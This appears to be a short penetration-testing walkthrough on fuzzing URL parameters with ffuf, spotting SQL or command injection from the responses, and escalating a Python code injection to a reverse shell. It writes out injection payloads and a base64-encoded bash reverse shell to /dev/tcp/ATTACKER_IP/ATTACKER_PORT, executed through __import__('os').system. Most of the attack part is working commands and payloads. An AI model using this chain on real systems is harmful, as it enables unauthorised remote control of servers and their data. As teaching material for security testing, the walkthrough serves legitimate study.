Fuzzing URL Parameters can show easy ways to get code execution, sqli etc.

# Example
Take the following request:

![image](https://github.com/user-attachments/assets/414ef308-71c2-436b-bfaf-f3d8e690bc76)

## Step 1: Copy to file
![image](https://github.com/user-attachments/assets/dc63395b-ad89-431a-bb16-17cb4b8fcfdf)

In this case, the file is saved as "search.req".

## Step 2: Add fuzz to request
![image](https://github.com/user-attachments/assets/1ffc985b-21b2-4d2a-a7ed-acab02dabe21)

## Step 3: ffuf
```bash
ffuf -request search.req -request-proto http -w /usr/share/wordlists/seclists/Fuzzing/special-chars.txt -ms 0
```
-request-proto only is required for http as https is the default.
## Step 4: Analyze output
![image](https://github.com/user-attachments/assets/9ff86037-bf98-4763-9f60-4a686f5a853e)

This shows that when the parameter has a \ or ' at the end of it, the page returns nothing - indicating either SQL injection or command injection.

### SQLi Checks
Try standard SQLi checks such as -- - # // 

### Command Injection Checks
If there is a ', then it may form part of a statement - for example: print('INPUT'). So if INPUT=')# and it is similar to the example, then the statement will be print('')#') which is valid and the page will return content instead of 0.

INPUT: 
```
abc'
```
![image](https://github.com/user-attachments/assets/250bcf49-a2c6-45db-b5bd-339990ce7b04)

INPUT:
```
abc')#
```
![image](https://github.com/user-attachments/assets/047e987e-6749-4fdf-9962-aa6c2b2c2a04)

To demonstrate how this leads to code execution, let's try the following: 
```
abc')%20%2b%20print('Code%20Execution%20possible!')%23%20
``` 
![image](https://github.com/user-attachments/assets/13445b76-739a-421a-ac3f-bc6ea4f74a46)

To get a reverse shell, do the following:
```bash
echo -n "bash -c 'bash -i >& /dev/tcp/$(ATTACKER_IP)/$(ATTACKER_PORT) 0>&1'" | base64
```
Add the following payload to the vulnerable parameter:
```
__import__('os').system('echo -n $OUTPUT_OF_PREVIOUS_COMMAND | base64 -d | bash')
```
REMEMBER TO URL ENCODE THE PAYLOAD!!! Make sure characters such as + are encoded and not mistaken for spaces!
